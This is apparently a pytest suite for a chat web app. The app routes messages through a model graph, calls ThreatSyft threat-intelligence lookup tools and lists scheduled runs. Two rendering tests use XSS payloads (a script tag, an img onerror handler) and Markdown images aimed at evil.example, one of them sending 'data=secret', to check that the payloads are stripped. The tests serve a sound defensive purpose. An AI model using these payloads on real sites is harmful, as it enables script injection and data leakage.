"""The web site, driven over HTTP against the real graph and a real database.

Only the model is scripted. The site's job is to carry a message into the graph
and an answer back out, so everything between those two points stays real.
"""

import asyncio
from collections.abc import Awaitable, Callable
from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import Any
from unittest.mock import Mock
from uuid import uuid4

import httpx
from langchain_core.messages import AIMessage
from langchain_core.tools import BaseTool, tool
from langgraph.checkpoint.sqlite.aio import AsyncSqliteSaver
from test_scheduled_run_history import write_record

from oris.chat import create_oris_graph
from oris.scheduled_run_history import ScheduledRunHistory
from oris.web import create_app


def _model(answer: str | Exception) -> Mock:
    model = Mock()
    if isinstance(answer, Exception):
        model.invoke.side_effect = answer
    else:
        model.invoke.return_value = AIMessage(content=answer)
    return model


async def _threatsyft_not_used() -> dict[str, BaseTool]:
    raise AssertionError("this test should not reach ThreatSyft")


def _visit(
    tmp_path: Path,
    model: Mock,
    visit: Callable[[httpx.AsyncClient], Awaitable[Any]],
    load_threatsyft: Callable[
        [], Awaitable[dict[str, BaseTool]]
    ] = _threatsyft_not_used,
    **site: Any,
) -> Any:
    async def run() -> Any:
        database_path = tmp_path / "checkpoints.sqlite"
        async with AsyncSqliteSaver.from_conn_string(str(database_path)) as saver:
            graph = create_oris_graph(Mock(), Mock(), Mock(), model, checkpointer=saver)
            transport = httpx.ASGITransport(
                app=create_app(graph, database_path, load_threatsyft, **site)
            )
            async with httpx.AsyncClient(
                transport=transport, base_url="http://oris"
            ) as client:
                return await visit(client)

    return asyncio.run(run())


def test_a_message_is_answered_by_plain_chat_with_formatting(tmp_path: Path) -> None:
    """The model answers directly, with no routing, and Markdown becomes HTML."""
    model = _model("This is **bold**.")

    async def visit(client: httpx.AsyncClient) -> httpx.Response:
        return await client.post(f"/api/chat/{uuid4()}", json={"text": "Hello"})

    response = _visit(tmp_path, model, visit)

    assert response.status_code == 200
    assert "<strong>bold</strong>" in response.json()["html"]
    assert model.invoke.call_args.args[0][-1].content == "Hello"
    model.with_structured_output.return_value.invoke.assert_not_called()


def test_a_conversation_comes_back_and_stays_separate(tmp_path: Path) -> None:
    """Reloading shows this conversation's turns and no other conversation's."""
    conversation, other = uuid4(), uuid4()
    model = _model("An *answer*.")

    async def visit(client: httpx.AsyncClient) -> tuple[Any, Any]:
        await client.post(f"/api/chat/{conversation}", json={"text": "<b>Hi</b>"})
        kept = await client.get(f"/api/chat/{conversation}")
        empty = await client.get(f"/api/chat/{other}")
        return kept.json(), empty.json()

    kept, empty = _visit(tmp_path, model, visit)

    assert kept["messages"][0] == {"role": "you", "text": "<b>Hi</b>"}
    assert kept["messages"][1]["role"] == "oris"
    assert "<em>answer</em>" in kept["messages"][1]["html"]
    assert empty["messages"] == []


def test_an_answer_cannot_put_html_or_images_on_the_page(tmp_path: Path) -> None:
    """Answers can carry text from the open web, so none of it may run or load."""
    model = _model(
        "<script>alert(1)</script>\n\n"
        "<img src=x onerror=alert(1)>\n\n"
        "![leak](https://evil.example/?data=secret)\n"
    )

    async def visit(client: httpx.AsyncClient) -> httpx.Response:
        return await client.post(f"/api/chat/{uuid4()}", json={"text": "Hello"})

    rendered = _visit(tmp_path, model, visit).json()["html"]

    assert "<script" not in rendered
    assert "<img" not in rendered


def test_a_table_in_an_answer_is_drawn_as_a_table(tmp_path: Path) -> None:
    """Models answer in tables often, and plain Markdown leaves them as pipes."""
    model = _model("| a | b |\n|---|---|\n| 1 | 2 |\n")

    async def visit(client: httpx.AsyncClient) -> httpx.Response:
        return await client.post(f"/api/chat/{uuid4()}", json={"text": "Hello"})

    assert "<table>" in _visit(tmp_path, model, visit).json()["html"]


def test_a_failed_turn_says_why_and_leaves_no_trace(tmp_path: Path) -> None:
    """The reader sees the reason, and the failed request is not in the history."""
    conversation = uuid4()
    model = _model(RuntimeError("model offline"))

    async def visit(client: httpx.AsyncClient) -> tuple[httpx.Response, Any]:
        failed = await client.post(f"/api/chat/{conversation}", json={"text": "Hi"})
        history = await client.get(f"/api/chat/{conversation}")
        return failed, history.json()

    failed, history = _visit(tmp_path, model, visit)

    assert failed.status_code == 502
    assert "model offline" in failed.json()["error"]
    assert history["messages"] == []


def test_the_address_of_the_site_opens_a_new_conversation(tmp_path: Path) -> None:
    """Each visit gets its own conversation, whose page can then be loaded."""

    async def visit(client: httpx.AsyncClient) -> tuple[str, str, httpx.Response]:
        first = (await client.get("/")).headers["location"]
        second = (await client.get("/")).headers["location"]
        return first, second, await client.get(first)

    first, second, page = _visit(tmp_path, _model("unused"), visit)

    assert first.startswith("/chat/")
    assert first != second
    assert page.status_code == 200
    assert "text/html" in page.headers["content-type"]


ENRICHED = {
    "ok": True,
    "tool": "enrich",
    "query": {"indicator": "8.8.8.8"},
    "data": {
        "indicator": "8.8.8.8",
        "indicator_type": "ip",
        "source_summary": {"ok": 1, "failed": 1},
        "sources": {
            "dns": {"ok": True, "data": {"names": ["dns.google"]}},
            "shodan": {
                "ok": False,
                "code": "authentication_error",
                "message": "Shodan rejected the configured API key.",
                "details": {"status_code": 401},
            },
        },
        "warnings": [],
    },
    "error": None,
}

LOOKED_UP = {
    "ok": True,
    "tool": "lookup",
    "query": {"reference": "APT29"},
    "data": {
        "reference": "APT29",
        "reference_type": "name",
        "source_summary": {"ok": 1, "failed": 1},
        "sources": {
            "misp_actor": {"ok": True, "data": {"name": "APT29"}},
            "ransomware": {
                "ok": False,
                "code": "not_found",
                "message": "APT29 does not appear in the local leak-site claims.",
            },
        },
        "warnings": [],
    },
    "error": None,
}


ENRICHMENT_STATUS = {
    "ok": True,
    "tool": "enrichment_status",
    "query": {},
    "data": {
        "providers": {
            "shodan": {
                "api_keys": {"SHODAN_API_KEY": False},
                "configured": False,
                "key_optional": False,
                "usable": False,
                "indicator_types": ["ip"],
            }
        },
        "keyless_sources": {"dns": "DNS records."},
        "secret_values_returned": False,
    },
    "error": None,
}

KNOWLEDGE_STATUS = {
    "ok": True,
    "tool": "knowledge_status",
    "query": {},
    "data": {
        "ready": True,
        "snapshots": {
            "kev": {
                "status": "available",
                "file_modified_at": "2026-08-12T01:32:17+00:00",
                "setup_command": "threatsyft-update kev",
                "counts": {"vulnerabilities": 1665},
            }
        },
    },
    "error": None,
}


def _threatsyft(calls: list[str]) -> Callable[[], Awaitable[dict[str, BaseTool]]]:
    """Real LangChain tools answering the way the MCP adapter's tools do."""

    @tool("enrich", response_format="content_and_artifact")
    async def enrich(indicator: str) -> tuple[str, dict[str, Any]]:
        """Stand in for ThreatSyft's enrich tool."""
        calls.append(indicator)
        return "", {"structured_content": ENRICHED}

    @tool("lookup", response_format="content_and_artifact")
    async def lookup(reference: str) -> tuple[str, dict[str, Any]]:
        """Stand in for ThreatSyft's lookup tool."""
        calls.append(reference)
        return "", {"structured_content": LOOKED_UP}

    @tool("enrichment_status", response_format="content_and_artifact")
    async def enrichment_status() -> tuple[str, dict[str, Any]]:
        """Stand in for ThreatSyft's enrichment_status tool."""
        return "", {"structured_content": ENRICHMENT_STATUS}

    @tool("knowledge_status", response_format="content_and_artifact")
    async def knowledge_status() -> tuple[str, dict[str, Any]]:
        """Stand in for ThreatSyft's knowledge_status tool."""
        return "", {"structured_content": KNOWLEDGE_STATUS}

    async def load() -> dict[str, BaseTool]:
        return {
            "enrich": enrich,
            "lookup": lookup,
            "enrichment_status": enrichment_status,
            "knowledge_status": knowledge_status,
        }

    return load


def test_a_lookup_shows_exactly_what_threatsyft_returned(tmp_path: Path) -> None:
    """Every source arrives unaltered and in order, including the failed ones."""
    calls: list[str] = []

    async def visit(client: httpx.AsyncClient) -> httpx.Response:
        return await client.post("/api/tools/enrich", json={"indicator": "8.8.8.8"})

    response = _visit(tmp_path, _model("unused"), visit, _threatsyft(calls))

    assert response.status_code == 200
    assert response.json() == ENRICHED
    assert list(response.json()["data"]["sources"]) == ["dns", "shodan"]
    assert calls == ["8.8.8.8"]


def test_a_cve_or_threat_actor_goes_to_threatsyfts_lookup_tool(tmp_path: Path) -> None:
    """References use lookup, and its result arrives unaltered."""
    calls: list[str] = []

    async def visit(client: httpx.AsyncClient) -> httpx.Response:
        return await client.post("/api/tools/lookup", json={"reference": "APT29"})

    response = _visit(tmp_path, _model("unused"), visit, _threatsyft(calls))

    assert response.status_code == 200
    assert response.json() == LOOKED_UP
    assert calls == ["APT29"]


def test_the_page_can_only_reach_the_tools_it_offers(tmp_path: Path) -> None:
    """Any other ThreatSyft tool is refused before anything is connected."""
    loads: list[int] = []

    async def counted_load() -> dict[str, BaseTool]:
        loads.append(1)
        return {}

    async def visit(client: httpx.AsyncClient) -> httpx.Response:
        return await client.post("/api/tools/extract_iocs", json={"text": "1.1.1.1"})

    response = _visit(tmp_path, _model("unused"), visit, counted_load)

    assert response.status_code == 404
    assert loads == []


def test_threatsyft_connects_on_the_first_lookup_and_only_once(
    tmp_path: Path,
) -> None:
    """The site starts without ThreatSyft, and lookups reuse one connection."""
    loads: list[int] = []
    load_tool = _threatsyft([])

    async def counted_load() -> dict[str, BaseTool]:
        loads.append(1)
        return await load_tool()

    async def visit(client: httpx.AsyncClient) -> tuple[int, int]:
        await client.get("/tools")
        before = len(loads)
        for _ in range(2):
            await client.post("/api/tools/enrich", json={"indicator": "8.8.8.8"})
        return before, len(loads)

    assert _visit(tmp_path, _model("unused"), visit, counted_load) == (0, 1)


def test_threatsyft_being_unavailable_says_why_and_chat_still_works(
    tmp_path: Path,
) -> None:
    """A missing lookup service costs the lookup, not the rest of the site."""

    async def unavailable() -> dict[str, BaseTool]:
        raise ValueError("THREATSYFT_ROOT is required")

    async def visit(client: httpx.AsyncClient) -> tuple[httpx.Response, int]:
        failed = await client.post("/api/tools/enrich", json={"indicator": "8.8.8.8"})
        chat = await client.post(f"/api/chat/{uuid4()}", json={"text": "Hello"})
        return failed, chat.status_code

    failed, chat_status = _visit(tmp_path, _model("Hi."), visit, unavailable)

    assert failed.status_code == 502
    assert "THREATSYFT_ROOT is required" in failed.json()["error"]
    assert chat_status == 200


def test_the_status_page_reports_providers_and_catalogs(tmp_path: Path) -> None:
    """Both of ThreatSyft's status answers arrive unaltered, side by side."""

    async def visit(client: httpx.AsyncClient) -> httpx.Response:
        return await client.get("/api/status")

    response = _visit(tmp_path, _model("unused"), visit, _threatsyft([]))

    assert response.status_code == 200
    assert response.json() == {
        "enrichment": ENRICHMENT_STATUS,
        "knowledge": KNOWLEDGE_STATUS,
    }


def test_the_status_page_says_why_when_threatsyft_is_unavailable(
    tmp_path: Path,
) -> None:
    """The one page about whether ThreatSyft works must survive it not working."""

    async def unavailable() -> dict[str, BaseTool]:
        raise ValueError("THREATSYFT_ROOT is required")

    async def visit(client: httpx.AsyncClient) -> httpx.Response:
        return await client.get("/api/status")

    response = _visit(tmp_path, _model("unused"), visit, unavailable)

    assert response.status_code == 502
    assert "THREATSYFT_ROOT is required" in response.json()["error"]


def test_the_status_tools_cannot_be_called_as_lookups(tmp_path: Path) -> None:
    """Being loaded for the status page does not put them in the lookup route."""

    async def visit(client: httpx.AsyncClient) -> httpx.Response:
        return await client.post("/api/tools/knowledge_status", json={})

    response = _visit(tmp_path, _model("unused"), visit, _threatsyft([]))

    assert response.status_code == 404


def test_the_pages_and_shared_files_are_served(tmp_path: Path) -> None:
    """Every page depends on these files existing where the site says they are."""
    wanted = {
        "/tools": "text/html",
        "/status": "text/html",
        "/runs": "text/html",
        "/runs/any-run": "text/html",
        "/web.css": "text/css",
        "/web.js": "javascript",
    }

    async def visit(client: httpx.AsyncClient) -> dict[str, httpx.Response]:
        return {path: await client.get(path) for path in wanted}

    responses = _visit(tmp_path, _model("unused"), visit)

    for path, content_type in wanted.items():
        assert responses[path].status_code == 200, path
        assert content_type in responses[path].headers["content-type"], path


SCHEDULE = """
timezone = "America/Detroit"

[[jobs]]
id = "good-job"
enabled = true
cron = "0 7 * * *"
task = "web_research"
prompt = "Research."
date_window = "previous_day"
search_category = "news"

[[jobs]]
id = "paused-job"
enabled = false
cron = "0 7 * * *"
task = "web_research"
prompt = "Research."
date_window = "previous_day"
search_category = "news"

[[jobs]]
id = "broken-job"
enabled = true
cron = "not a cron"
task = "web_research"
prompt = "Research."
date_window = "previous_day"
search_category = "news"
"""


def _runs_site(tmp_path: Path) -> dict[str, Any]:
    schedule_file = tmp_path / "schedules.toml"
    schedule_file.write_text(SCHEDULE, encoding="utf-8")
    return {
        "runs": ScheduledRunHistory(tmp_path / "scheduled"),
        "schedule_file": schedule_file,
    }


def _get(tmp_path: Path, path: str, site: dict[str, Any]) -> httpx.Response:
    async def visit(client: httpx.AsyncClient) -> httpx.Response:
        return await client.get(path)

    return _visit(tmp_path, _model("unused"), visit, **site)


def test_each_job_says_when_it_next_runs(tmp_path: Path) -> None:
    """Disabled jobs have no next run, and a bad cron is named on its own row."""
    jobs = _get(tmp_path, "/api/runs", _runs_site(tmp_path)).json()["jobs"]
    by_id = {job["id"]: job for job in jobs}

    next_run = datetime.fromisoformat(by_id["good-job"]["next_run"])
    assert next_run > datetime.now(UTC)
    assert by_id["paused-job"]["enabled"] is False
    assert by_id["paused-job"]["next_run"] is None
    assert by_id["broken-job"]["next_run"] is None
    assert by_id["broken-job"]["problem"]


def test_recent_runs_are_newest_first_and_failures_say_why(tmp_path: Path) -> None:
    """A failed run keeps no report, so its row is the only trace of it."""
    site = _runs_site(tmp_path)
    root = tmp_path / "scheduled"
    write_record(root, "news", "2026-08-30T07:00:00Z", "older")
    write_record(
        root,
        "news",
        "2026-08-31T07:00:00Z",
        "newer",
        status="failed",
        error="model offline",
        with_report=False,
    )

    runs = _get(tmp_path, "/api/runs", site).json()["runs"]

    assert [run["run_id"] for run in runs] == ["newer", "older"]
    assert runs[0]["status"] == "failed"
    assert runs[0]["error"] == "model offline"
    assert runs[0]["has_report"] is False
    assert runs[1]["has_report"] is True


def test_a_shortened_list_says_how_much_it_left_out(tmp_path: Path) -> None:
    """A list that quietly stops at a limit reads as the complete history."""
    site = _runs_site(tmp_path)
    for day in range(1, 23):
        write_record(
            tmp_path / "scheduled",
            "news",
            f"2026-08-{day:02d}T07:00:00Z",
            f"run-{day}",
        )

    body = _get(tmp_path, "/api/runs", site).json()

    assert len(body["runs"]) == 20
    assert body["total"] == 22


def test_an_unreadable_schedule_does_not_hide_the_run_history(tmp_path: Path) -> None:
    """Past runs are still true when the schedule file is missing or broken."""
    write_record(tmp_path / "scheduled", "news", "2026-08-30T07:00:00Z", "only")
    site = {
        "runs": ScheduledRunHistory(tmp_path / "scheduled"),
        "schedule_file": tmp_path / "missing.toml",
    }

    body = _get(tmp_path, "/api/runs", site).json()

    assert "missing.toml" in body["schedule_error"]
    assert body["jobs"] == []
    assert [run["run_id"] for run in body["runs"]] == ["only"]


def test_a_report_opens_formatted_and_safe(tmp_path: Path) -> None:
    """Reports are built from web pages, so they get the same care as answers."""
    site = _runs_site(tmp_path)
    root = tmp_path / "scheduled"
    write_record(root, "news", "2026-08-30T07:00:00Z", "with-report")
    next(root.glob("news/*.md")).write_text(
        "# Heading\n\n<script>alert(1)</script>\n\n![x](https://evil.example/a)\n",
        encoding="utf-8",
    )

    body = _get(tmp_path, "/api/runs/with-report", site).json()

    assert "<h1>Heading</h1>" in body["html"]
    assert "<script" not in body["html"]
    assert "<img" not in body["html"]
    assert body["run"]["job_id"] == "news"


def test_a_run_with_no_report_opens_with_its_reason(tmp_path: Path) -> None:
    """Failures are worth opening, and there is simply no report to show."""
    site = _runs_site(tmp_path)
    write_record(
        tmp_path / "scheduled",
        "news",
        "2026-08-30T07:00:00Z",
        "failed-run",
        status="failed",
        error="model offline",
        with_report=False,
    )

    body = _get(tmp_path, "/api/runs/failed-run", site).json()

    assert body["html"] is None
    assert body["run"]["error"] == "model offline"


def test_a_run_must_be_named_exactly(tmp_path: Path) -> None:
    """A partial ID could open the wrong run, so it opens nothing."""
    site = _runs_site(tmp_path)
    write_record(tmp_path / "scheduled", "news", "2026-08-30T07:00:00Z", "abcdef-123")

    assert _get(tmp_path, "/api/runs/abcdef", site).status_code == 404


def _many_runs(tmp_path: Path, count: int, job: str = "news", start: int = 0) -> None:
    """Record `count` runs an hour apart, so `run-0` is always the oldest."""
    first = datetime(2026, 8, 1, tzinfo=UTC)
    for number in range(start, start + count):
        started = first + timedelta(hours=number)
        write_record(
            tmp_path / "scheduled",
            job,
            started.strftime("%Y-%m-%dT%H:%M:%SZ"),
            f"run-{number}",
        )


def test_older_runs_can_be_reached_a_page_at_a_time(tmp_path: Path) -> None:
    """Each page continues from the last, and the final page is whatever is left."""
    site = _runs_site(tmp_path)
    _many_runs(tmp_path, 45)

    second = _get(tmp_path, "/api/runs?size=20&page=2", site).json()
    last = _get(tmp_path, "/api/runs?size=20&page=3", site).json()

    assert [run["run_id"] for run in second["runs"]][:2] == ["run-24", "run-23"]
    assert len(second["runs"]) == 20
    assert [run["run_id"] for run in last["runs"]] == [
        "run-4",
        "run-3",
        "run-2",
        "run-1",
        "run-0",
    ]
    assert second["total"] == 45
    assert second["page"] == 2


def test_a_page_can_hold_20_50_or_100_runs(tmp_path: Path) -> None:
    """Those three sizes work, and anything else falls back to the smallest."""
    site = _runs_site(tmp_path)
    _many_runs(tmp_path, 60)

    sizes = {
        wanted: len(_get(tmp_path, f"/api/runs?size={wanted}", site).json()["runs"])
        for wanted in ("20", "50", "100", "7", "lots")
    }

    assert sizes == {"20": 20, "50": 50, "100": 60, "7": 20, "lots": 20}
    assert _get(tmp_path, "/api/runs", site).json()["page_sizes"] == [20, 50, 100]


def test_a_nonsense_page_number_shows_the_first_page(tmp_path: Path) -> None:
    """The address can be edited by hand, and that must not break the page."""
    site = _runs_site(tmp_path)
    _many_runs(tmp_path, 3)

    for page in ("0", "-1", "soon"):
        body = _get(tmp_path, f"/api/runs?page={page}", site).json()
        assert [run["run_id"] for run in body["runs"]][0] == "run-2", page
        assert body["page"] == 1, page


def test_runs_can_be_narrowed_to_one_job(tmp_path: Path) -> None:
    """The count describes the filtered list, and every job stays selectable."""
    site = _runs_site(tmp_path)
    _many_runs(tmp_path, 3, job="news")
    _many_runs(tmp_path, 2, job="podcasts", start=3)

    body = _get(tmp_path, "/api/runs?job=podcasts", site).json()

    assert [run["job_id"] for run in body["runs"]] == ["podcasts", "podcasts"]
    assert body["total"] == 2
    assert body["job"] == "podcasts"
    assert body["job_ids"] == ["news", "podcasts"]


def test_paging_applies_within_the_chosen_job(tmp_path: Path) -> None:
    """Page two of one job is that job's next runs, not the whole history's."""
    site = _runs_site(tmp_path)
    _many_runs(tmp_path, 25, job="news")
    _many_runs(tmp_path, 25, job="podcasts", start=25)

    body = _get(tmp_path, "/api/runs?job=news&size=20&page=2", site).json()

    assert body["total"] == 25
    assert [run["run_id"] for run in body["runs"]][0] == "run-4"
    assert {run["job_id"] for run in body["runs"]} == {"news"}
